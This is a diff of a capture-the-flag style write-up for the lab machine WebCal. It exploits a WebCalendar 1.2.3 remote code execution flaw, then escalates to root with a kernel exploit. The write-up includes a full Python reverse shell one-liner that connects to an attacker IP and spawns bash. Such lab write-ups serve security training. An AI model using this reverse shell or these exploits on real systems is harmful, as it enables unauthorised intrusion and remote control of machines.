@@ -1,3 +1,5 @@
+#### Enumeration
+
 ##### Nmap 
 
 ```
@@ -62,11 +64,11 @@ http://<IP>/webcalendar/docs/WebCalendar-SysAdmin.html
 
 Look for available vulnerabilities and find a [WebCalendar RCE](https://www.exploit-db.com/exploits/18775), because the server is running version 1.2.3, so it might work.
 
-After read the description. I plan to use Burp Suite to send the exploit request. Note that the code is written for use in php. The escape character backslash in the string must be removed. 
+After reading the description. I plan to use Burp Suite to send the exploit request. Note that the code is written for use in PHP. The escape character backslash in the string must be removed. 
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h36m16s_008_.png)
 
-I use the Repeater function to make it easier to test. First send exploit payload.
+I use the Repeater function to make it easier to test. First, send exploit payload.
 
 ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h02m07s_002_.png)
 
@@ -87,4 +89,36 @@ I use the python command below to successfully get the connection. Convert the c
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.191",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' 
 ```
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h06m39s_003_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_16h00m41s_016_.png)
+
+www-data
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h32m54s_006_.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h34m59s_007_.png)
+
+#### Privilege Escalation
+
+Execute linpeas.sh file to obtain suggestions.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h45m28s_011_.png)
+
+![imahe](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h42m51s_010_.png)
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h46m39s_012_.png)
+
+Reviewing the list, I found that the server uses an old version of the Linux kernel.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_15h00m12s_013_.png)
+
+After Googling, there is a possible suitable vulnerability "empodipper".
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_15h02m29s_014_.png)
+
+The first exploit way attempt failed.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_13h05m22s_001_.png)
+
+The second exploit way attempts to successfully obtain root privileges.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_15h07m50s_015_.png)
